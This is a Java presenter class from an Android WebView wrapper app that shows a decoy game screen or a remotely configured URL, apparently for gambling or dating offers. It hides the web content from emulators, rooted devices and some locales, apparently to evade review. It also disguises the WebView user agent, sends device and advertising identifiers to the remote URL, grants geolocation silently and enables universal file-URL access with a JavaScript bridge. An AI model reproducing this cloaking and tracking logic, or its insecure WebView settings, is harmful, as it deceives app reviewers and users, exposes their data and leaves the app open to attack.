package org.apache.mvp.presenter;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.GeolocationPermissions;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.annotation.Nullable;
import androidx.appcompat.UWView;
import androidx.appcompat.app.AlertDialog;

import org.apache.cordova.Cst;
import org.apache.cordova.utility.FraudPhishingChecker;
import org.apache.cordova.utils.Utils;

import androidx.browser.customtabs.CustomTabColorSchemeParams;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.trusted.TrustedWebActivityIntentBuilder;

import com.appsflyer.AppsFlyerLib;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.androidbrowserhelper.trusted.TwaLauncher;

import com.walhalla.ui.DLog;
import com.walhalla.webview.BuildConfig;
import com.walhalla.webview.ChromeView;
import com.walhalla.webview.CustomWebViewClient;

import org.apache.cordova.Gfg;
import org.apache.cordova.R;
import org.apache.cordova.domen.ScreenType;
import org.apache.cordova.TPreferences;

import org.apache.cordova.domen.UIVisibleDataset;
import org.apache.cordova.enumer.UrlSaver;
import org.apache.cordova.repository.AbstractDatasetRepository;
import org.apache.cordova.repository.DatasetRepository;

import org.apache.cordova.repository.impl.AbstractFirebaseRepository;

import org.apache.cordova.v70.app.MyJavascriptInterface;
import org.apache.mvp.ReferrerAdapter;
import org.apache.mvp.MainView;
import org.apache.utils.CustomTabUtils;

import java.io.IOException;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.TimeZone;

public class MainPresenter extends BasePresenter
        implements SharedPreferences.OnSharedPreferenceChangeListener,
        DatasetRepository.RepoCallback {


    private final TPreferences pref;
    private final Gfg aaa;


    private final AbstractDatasetRepository repository;
    private final CustomTabsIntent customTabsIntent;


    private String lUrl; //Saved tracker url

    //File Selector
    protected ActivityResultLauncher<Intent> requestSelectFileLauncher;
    
    protected ValueCallback<Uri[]> uploadMessage;

    private final List<TwaLauncher> launchers0 = new ArrayList<>();
    public static final String LIST_DIVIDER = "\\|";
    public static final String NONENONE = "";
    private static final String TAG = "@@@";

    private final Activity context;
    private final MainView mView;

    private AlertDialog dialog; //demo mode dialog


    private boolean onlyOnetime = false;//resume method

    public MainPresenter
            (
                    MainView mainView,
                    Activity context,
                    Gfg aaa,
                    Handler handler,
                    @Nullable AbstractDatasetRepository repository
            ) {
        super(handler);

        this.mView = mainView;
        this.context = context;
        this.pref = TPreferences.getInstance(this.context);
        this.aaa = aaa;

        this.repository = repository;
        if (this.repository != null) {
            this.repository.setCallback(this);
        }
        if (!(UrlSaver.OH_NONE == aaa.getSaver())) {
            lUrl = pref.getTargetUrl();
        } else {
            lUrl = null;
        }
        this.customTabsIntent = CustomTabUtils.customWeb(context);
//        preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
//        preferences.registerOnSharedPreferenceChangeListener(this);
    }


    public static String makeUrl(String url, TPreferences preferences, Context context) {
        try {
            String language = Locale.getDefault().getLanguage().toLowerCase();
            String deepLink = preferences.getDeeplink();
            String client_id = preferences.getPreferences().getString(Cst.UrlBuilder.key_pref_param_clid, "");//new param

            boolean is_from_push = preferences.isFromPushLaunch();
            String advertisingId = preferences.getAdvertisingId();

            @SuppressLint("HardwareIds") String android_id = Settings.Secure.getString(context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);

            url = Utils.appendUri(url, "is_from_push" + "=" + is_from_push);
            url = Utils.appendUri(url, "time_zone=" + Utils.timeZone());
            url = Utils.appendUri(url, "lang=" + language);


            //new param
            if (!TextUtils.isEmpty(client_id)) {
                url = Utils.appendUri(url, "client_id=" + client_id);
            }

            url = Utils.appendUri(url, Cst.param_advertisingId + "=" + advertisingId);


            url = Utils.appendUri(url, Cst.UrlBuilder.KEY_APP + "=" + context.getPackageName());
            url = Utils.appendUri(url, "getz" + "=" + TimeZone.getDefault().getID());


            url = Utils.appendUri(url, Cst.UrlBuilder.KEY_COUNTRY + "="
                    + Utils.getCountryCode(context));
            url = Utils.appendUri(url, "model=" + Utils.getBrand());
            String qqq = "kwk_app";//context.getString(R.string.app_name);

            Map<String, Object> map = new HashMap<>();
            map.put(Cst.KEY_BID, android_id);
            map.put(Cst.KEY_DEVICE, Utils.getBrand());
            map.put(Cst.KEY_DEVICE_MODEL, Utils.getDeviceModel());
            map.put( Cst.keyword, qqq);
            map.put(Cst.creative, qqq);
            map.put(Cst.campid, String.valueOf(1));
            map.put(Cst.adposition, 1);
            map.put(Cst.matchtype, 1);
            map.put(Cst.network, 1);
            map.put(Cst.placement, 1);
            map.put(Cst.target, 1);
            map.put(Cst.adid, 1);
            map.put(Cst.gclid, 1);
            map.put(Cst.zoneid, language);
            url = Utils.appendUri(url, map);

            url = Utils.appendUri(url, "ifdevice" + "=" + "mobile");
            url = Utils.appendUri(url, "utm_campaign" + "=" + "DATING-1");//campaignid
            url = Utils.appendUri(url, "utm_content" + "=" + "google_play_dating"); //{creative}



            //url = Utils.appendUri(url, KEY_AF_ID + "=" + AppsFlyerLib.getInstance().getAppsFlyerUID(context));

            String apps_flyer_id = AppsFlyerLib.getInstance().getAppsFlyerUID(context);
            if (!TextUtils.isEmpty(apps_flyer_id)) {
                url = Utils.appendUri(url, "apps_flyer_id" + "=" + apps_flyer_id);
            }
            String ref = preferences.getReferrer();


            //DLog.d("@@@@@@@@" + ref + "@@@@@@@@@"); //utm_source=google-play&utm_medium=organic

            if (ref != null) {
                //+ Небольшие правки {} - тип источника трафика (organic/facebook/...)
                ref = ref.replace("utm_source", "traffic_source");//var 2.0

                url = url + "&" + ref;
                url = Utils.appendUri(url, "getr" + "=" + "%22" + ref + "%22");
            } else {
                url = Utils.appendUri(url, "getr" + "=" + "%22" + ref + "%22");
            }

        } catch (URISyntaxException e) {
            DLog.handleException(e);
        }
        //Log.d(TAG, "LOAD HTML DATA FROM --> " + url);
        return url;
    }

    public void init0(Context context) {
        dialog = new AlertDialog.Builder(context)
                .setTitle(R.string.app_name)
                .setMessage("UNPAID DEMO VERSION...")
                .setIcon(R.mipmap.ic_launcher)
                .setCancelable(true)
//                        .setNegativeButton("ОК, ...",
//                                new DialogInterface.OnClickListener() {
//                                    public void onClick(DialogInterface dialog, int id) {
//                                        dialog.cancel();
//                                    }
//                                });
                .create();
        adapter = new ReferrerAdapter(context, pref, mView);
    }

    protected ReferrerAdapter adapter;

    @Override
    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
        final Map<String, ?> keys = pref.getPreferences().getAll();
        final Set<? extends Map.Entry<String, ?>> bbb = keys.entrySet();
        for (Map.Entry<String, ?> entry : bbb) {
            if (TPreferences.CheckKey.CH_UTM_MEDIUM.equals(key)) {
                //value contains Cst.KEY_ORGANIC
                //Log.d(TAG, "ORGANIC_TRIGGER");
                //wrapContent0Request();
                return;
            } else if (TPreferences.CheckKey.CH_DEEPLINK.equals(key)) {
                Log.d(TAG, "=========>>>>" + key + "::" + entry.getValue());
                if (mView.handleDeepLink()) {
                    mView.PEREHOD_S_DEEPLINKOM();
                }
                return;
            }
        }
    }

    public void onResume(Intent intent) {
        //DLog.d("@@@@@@@@@@@@@@@@" + aaa.ENABLE_TRACKER);
        if (!onlyOnetime) {
            if (aaa.isEnableTracker()//&& !BuildConfig.DEBUG

            ) {
                AbstractFirebaseRepository repository1 = new AbstractFirebaseRepository(context) {
                    @Override
                    public void getConfig(Context context) {

                    }
                };
                repository1.updateUpdater0Request();
            }
            onlyOnetime = true;


            //DLog.d("[==>>intent]" + intent.toString()+" "+intent.getAction());

            if (mView.handleDeepLink()) {
                String deepLink = pref.getDeeplink();
                if (deepLink == null) {
                    String action = intent.getAction();

                    if ("android.intent.action.VIEW".equals(action)) {
                        Uri data = intent.getData();
                        if (data != null && data.isHierarchical()) {
                            String rawUrl = intent.getDataString();
                            if (!TextUtils.isEmpty(rawUrl)) {
                                pref.setDeeplink(rawUrl);
                                //Send deep link data..
                                //PEREHOD_S_DEEPLINKOM();
                            } else {
                                wrapRequest();
                            }
                        }
                    } else {
                        wrapRequest();
                    }
                } else {
                    mView.PEREHOD_S_DEEPLINKOM();
                }
            } else {
                wrapRequest();
            }
        }
    }

    private void wrapRequest() {
        if (aaa.isWRAPenabled()) {
            wrapContentRequest();
        }
    }

    public void wrapContentRequest() {


        //@@@   boolean organic = preferences.getBoolean(Config.KEY_ORGANIC, false);
        //@@@   if (organic) {
        //webOrGame(organic);


        //@@@ DLog.d(storage.checkLock(this) + "#" + organic);
        //@@@}


        //DLog.d("Emulator? " +  + " " + Build.MANUFACTURER + Build.MODEL);
        //Build.MANUFACTURER --> Google
        //Build.MODEL --> Pixel
        //DLog.d("[E] " +  + " " + Utils.isSimSupport(context));

        if (mView.checkDevice() != null) {
            if (mView.checkDevice().isCheckEmulator() && FraudPhishingChecker.isProbablyAnEmulator()) {
                mView.hiDeRefreshLayout();
                return;
            }
            if (mView.checkDevice().isCheckRoot() && Utils.isDeviceRooted()) {
                mView.hiDeRefreshLayout();
                return;
            }
            // Проверка на подпись приложения
            if (mView.checkDevice().isPackageSignature() && !Utils.isAppSignatureValid(context)) {
                mView.hiDeRefreshLayout();
                return;
            }
        }

        //Local payload
        UIVisibleDataset localDataset = mView.data();
        //DLog.d("LOCALE1" + storage.appWebDisabler(this) + " " + Build.MANUFACTURER + Build.MODEL);
        if (pref.appWebDisabler(context) || localDataset != null) {//show main screen
            DLog.d("<wd> " + pref.appWebDisabler(context));
            makeView(localDataset);
        } else {

            if (!mView.rotated()) {
                if (!(UrlSaver.OH_NONE == aaa.getSaver())) {
                    lUrl = pref.getTargetUrl();
                    //lUrl = "https://2ip.ru";
                    DLog.d("@ww@" + lUrl);
                } else {
                    lUrl = null;
                }

                //Нет сохраненных URL
                if (TextUtils.isEmpty(lUrl)) {
                    DLog.d("cccc" + lUrl);
                    makeView(null); //null
                    // https://arbuztyt.xyz/
                    //"https://mazoksanusa.xyz"
                    //"https://indianpzdc.xyz/"
                    //final KwkRemoteRepository repository = new KwkRemoteRepository(new Handler(), "https://mazoksanusa.xyz", this, this);
                    //final KwkRemoteRepository repository = new KwkRemoteRepository(new Handler(),
                    // "https://indianpzdc.xyz/", this, this);
                    // final FirebaseRepository repo = new FirebaseRepository(this);
                    if (repository != null) {
                        repository.getConfig(context);
                    }
                } else {
                    DLog.d("sssscccc" + lUrl);
                    UIVisibleDataset aa = new UIVisibleDataset();
                    aa.setUrl(lUrl);
                    aa.setEnabled(true);
                    determineAdvertisingInfo0(aa, context);
                }
            }
        }
        //none mView.wrapContentRequest();
    }

    private String advertId = null;

    public void determineAdvertisingInfo0(UIVisibleDataset value, Activity context) {
        advertId = pref.getAdvertisingId();
        if (!TextUtils.isEmpty(advertId)) {
            makeView(value);
            return;
        }
        executor.execute(() -> {
            //Background work here
            AdvertisingIdClient.Info idInfo = null;
            try {
                idInfo = AdvertisingIdClient.getAdvertisingIdInfo(context.getApplicationContext());
                if (idInfo != null) {
                    advertId = idInfo.getId();
                }
            } catch (GooglePlayServicesNotAvailableException e) {
                DLog.handleException(e);
            } catch (GooglePlayServicesRepairableException e) {
                DLog.handleException(e);
            } catch (IOException e) {
                DLog.handleException(e);
            }

            handler.post(() -> {
                //UI Thread work here
                pref.setAdvertisingId(advertId);
                makeView(value);
            });
        });

//        if (AdvertisingIdClient.isAdvertisingIdProviderAvailable(this)) {
//            ListenableFuture<AdvertisingIdInfo> advertisingIdInfoListenableFuture =
//                    AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
//            Futures.addCallback(advertisingIdInfoListenableFuture,
//                    new FutureCallback<AdvertisingIdInfo>() {
//                        @Override
//                        public void onSuccess(AdvertisingIdInfo adInfo) {
//                            String id = adInfo.getId();
//                            String providerPackageName =
//                                    adInfo.getProviderPackageName();
//                            //boolean isLimitTrackingEnabled = adInfo.isLimitTrackingEnabled();
//                            DLog.d("@@@@" + id);
//                            preferences.edit()xaxax(Cst.advertisingId, id).apply();
//                            presenter.makeView(value);
//                        }
//
//                        // Any exceptions thrown by getAdvertisingIdInfo()
//                        // cause this method to get called.
//                        @Override
//                        public void onFailure(@NotNull Throwable throwable) {
//                            Log.e("@@@", "Failed to connect to Advertising ID provider.");
//                            // Try to connect to the Advertising ID provider again,
//                            // or fall back to an ads solution that doesn't require
//                            // using the Advertising ID library.
//                            presenter.makeView(value);
//                        }
//                    }, Executors.newSingleThreadExecutor());
//        } else {
//            DLog.d("The Advertising ID client library is unavailable. Use a different");
//            // library to perform any required ads use cases.
//            presenter.makeView(value);
//        }

    }

    public void onDestroy() {
        pref.getPreferences().unregisterOnSharedPreferenceChangeListener(null);
    }

    @SuppressLint("SourceLockedOrientationActivity")
    public void makeView(UIVisibleDataset dataset) {

        //dataset.url="https://pin-up.ru/";
        DLog.d("**** " + dataset);
        String url = null;
        if (dataset != null) {
            if (dataset.isDemo()) {
                if (dialog != null && !dialog.isShowing()) {
                    dialog.show();
                }
                return;
            }
            if (dialog != null && dialog.isShowing()) {
                dialog.hide();
            }

            String language0 = Locale.getDefault().getLanguage();
//            DLog.d("@@@@@@@" + language0 + ", " + Locale.getDefault().getLanguage()
//                    + "_@@" + Locale.getDefault().getCountry() +
//                    "@@ [" + Locale.getDefault().getDisplayName() + "]");

//            if (Locale.getDefault().getCountry().contains("IN")) {
//                dataset.setEnabled(false);
//            }

            //test
//            for (Locale locale : Locale.getAvailableLocales()) {
////                if (locale.getCountry().contains("IN")) {
////                    Log.d("@@@", locale.getLanguage() + "_" + locale.getCountry() + " [" + locale.getDisplayName() + "]");
////                }
//
////                hi_ [Hindi]
////                hi_IN [Hindi (India)]
//                if (locale.getLanguage().equals("hi")) {
//                    Log.d("@@@", locale.getLanguage() + "_" + locale.getCountry() + " [" + locale.getDisplayName() + "]");
//                }
//            }

            if (dataset.isEnabled()) {

                if (TextUtils.isEmpty(dataset.getWhitelist())) {
                    url = dataset.getUrl();
                } else {
                    final String[] white = dataset.getWhitelist().split(LIST_DIVIDER);
//                    Log.d(TAG, "_Set_: " + dataset.getUrl() + " " + language0.toLowerCase() +
//                            "\t" + dataset.isEnabled() + Arrays.toString(white));

                    for (String d : white) {
                        if (language0.toLowerCase().contains(d)) {

                            int newOrientation = -1;

//                            if (dataset.portrait != null) {
//                                newOrientation = dataset.portrait
//                                        ? ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
//                                        : ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE;
//                            } else if (mView.orientationWeb() != null){
//                                newOrientation = mView.orientationWeb()
//                                        ? ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
//                                        : ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE;
//                            }
//                            if (newOrientation != null) {
//                                if (context.getRequestedOrientation() != newOrientation) {
//                                    context.setRequestedOrientation(mView.orientationWeb());
//                                }
//                            }

                            url = dataset.getUrl();

                            //Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"),Locale.getDefault());
                            //Date currentLocalTime = calendar.getTime();

                            //DateFormat date = new SimpleDateFormat("Z");
                            //String localTime = date.format(currentLocalTime);
//                        DateFormat date = new SimpleDateFormat("z", Locale.getDefault());
//                        String localTime = date.format(currentLocalTime);
                            break;
                        }
                    }
                }
                if (!TextUtils.isEmpty(url)) {
                    //url = makeUrl(url, preferences, context);
                }
            } else {
//                if(!dataset.enabled) {
//                    pref.setMute("true");
//                }
            }


            if (ScreenType.WEB_RAW == dataset.getScreenType()) {
                mView.makeScreen(dataset);
            }
        }

        //Block one ore block 2
        DLog.d("**** @@@" + dataset + "@@" + url);

        if (TextUtils.isEmpty(url)) {
            if (dataset == null) {
                dataset = new UIVisibleDataset();
            }
            dataset.setScreenType(ScreenType.GAME_VIEW);
            dataset.setUrl(url);
            dataset.setEnabled(false);
            mView.makeScreen(dataset);
            //restart();
        } else {
            if (dataset == null) {
                dataset = new UIVisibleDataset();
            }
            dataset.setScreenType(ScreenType.WEB_VIEW);
            dataset.setUrl(url);
            mView.makeScreen(dataset);
            //launch(url);
        }
        DLog.d("**** " + dataset);
    }

    public void launchExternal(Context context, String url) {

        //Configure the color of the address bar
        CustomTabColorSchemeParams params = new CustomTabColorSchemeParams.Builder()
                .setToolbarColor(context.getResources().getColor(R.color.colorPrimaryDark))
                //.setNavigationBarColor(context.getResources().getColor(R.color.colorPrimaryDark))
                .build();
        TrustedWebActivityIntentBuilder toolbarColor = new TrustedWebActivityIntentBuilder(
                Uri.parse(url))
                .setDefaultColorSchemeParams(params);
        //.setNavigationBarColor(Color.WHITE) //deprecated
        //.setToolbarColor(Color.WHITE); //deprecated

        TwaLauncher twaLauncher = new TwaLauncher(context);
        twaLauncher.launch(toolbarColor,
                null,
                null,
                new Runnable() {
                    @Override
                    public void run() {
                        //completetionCallback
                    }
                }
        );
        this.launchers0.add(twaLauncher);

    }

    protected void makeFileSelector21_x(UWView __mView) {
        __mView.setWebChromeClient(new WebChromeClient() {

            @Override
            public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
                callback.invoke(origin, true, false);
            }

            // For 3.0+ Devices (Start)
            // onActivityResult attached before constructor
            private void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
               // __openFileChooser(uploadMsg, acceptType);
            }

            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
                __onShowFileChooser(webView, filePathCallback, fileChooserParams);
                return true;
            }
        });
    }

//    public void __openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
//        mUploadMessage = uploadMsg;
//        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
//        intent.addCategory(Intent.CATEGORY_OPENABLE);
//        intent.setType("image/*");
//        //startActivityForResult(Intent.createChooser(intent, "File Browser"), FILECHOOSER_RESULTCODE);
//        requestSelectFileLauncher.launch(Intent.createChooser(intent, "File Browser"));
//    }

    public void __onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, WebChromeClient.FileChooserParams fileChooserParams) {
        if (uploadMessage != null) {
            uploadMessage.onReceiveValue(null);
            uploadMessage = null;
        }
        uploadMessage = filePathCallback;
        Intent intent = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            intent = fileChooserParams.createIntent();
        }
        try {
            requestSelectFileLauncher.launch(intent);
            // startActivityForResult(intent, REQUEST_SELECT_FILE);
        } catch (ActivityNotFoundException e) {
            uploadMessage = null;
            //return false;
        }
    }


//    public void event(BodyClass event) {
//        FirebaseRepository.event(context, event);
//    }


    //Remote Repo Callback...
    @Override
    public void successResponse(UIVisibleDataset value) {
        DLog.d("@@d@" + value.getUrl() + " " + value.getEnabled());
        if (aaa.getSaver() == UrlSaver.FIRST) {
            if (value.getEnabled()) {
                if (!TextUtils.isEmpty(value.getUrl())) {
                    pref.setTargetUrl(value.getUrl());
                }
            } else {
                pref.setMute("true");
            }
        }
        determineAdvertisingInfo0(value, context);
    }

    public void saveFirstPageIfValid(String url) {
        if (UrlSaver.FIRST_REDIRECT == aaa.getSaver()) {
            if (lUrl == null && !TextUtils.isEmpty(url)) {
                lUrl = url;
                pref.setTargetUrl(url);
            }
        }
    }

    @Override
    public void handleError(String m) {
        if(BuildConfig.DEBUG){
            Toast.makeText(context, "ERROR: " + m, Toast.LENGTH_LONG).show();
        }
    }

    public void customTabsIntentLaunchUrl(String url) {
        try {

//        FirebaseAnalytics mFirebaseAnalytics = FirebaseAnalytics.getInstance(context);
//        Bundle bundle = new Bundle();
//        bundle.putString("goz_ad_click", "1");
//        mFirebaseAnalytics.logEvent("in_offer_open_click", bundle);
            customTabsIntent.launchUrl(context, Uri.parse(url));
        } catch (Exception e) {
            DLog.handleException(e);
        }
    }

    @SuppressLint({"SetJavaScriptEnabled", "ObsoleteSdkInt"})
    public void a123(ChromeView chromeView, UWView mView) {
        mView.getSettings().setSupportZoom(false);
        mView.getSettings().setDefaultTextEncodingName("utf-8");
        mView.getSettings().setLoadWithOverviewMode(true);
        mView.getSettings().getLoadsImagesAutomatically();
        mView.getSettings().setGeolocationEnabled(true);
        mView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        mView.getSettings().setDomStorageEnabled(true);
        mView.getSettings().setBuiltInZoomControls(false);
        mView.getSettings().setJavaScriptEnabled(true);
        mView.getSettings().setPluginState(WebSettings.PluginState.ON);
        mView.getSettings().setAllowFileAccess(true);
        mView.getSettings().setAllowContentAccess(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            mView.getSettings().setAllowFileAccessFromFileURLs(true);
            mView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        }

        //"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Safari/537.36 OPR/30.0.1856.93524"
        //System.getProperty("http.agent")
        String tmp = mView.getSettings().getUserAgentString();
        mView.getSettings().setUserAgentString(tmp.replace("; wv)", ")"));

        if (BuildConfig.DEBUG) {
            //mView.setBackgroundColor(Color.parseColor("#80000000"));
        }
        mView.setWebViewClient(new CustomWebViewClient(mView, chromeView, context));
        makeFileSelector21_x(mView);

        CookieManager.getInstance().setAcceptCookie(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(mView, true);
        }

//        __mView.addJavascriptInterface(
//                new MyJavascriptInterface(CompatActivity.this, __mView), "JSInterface");
        mView.addJavascriptInterface(new MyJavascriptInterface(mView.getContext(), mView), "Client");
    }
}
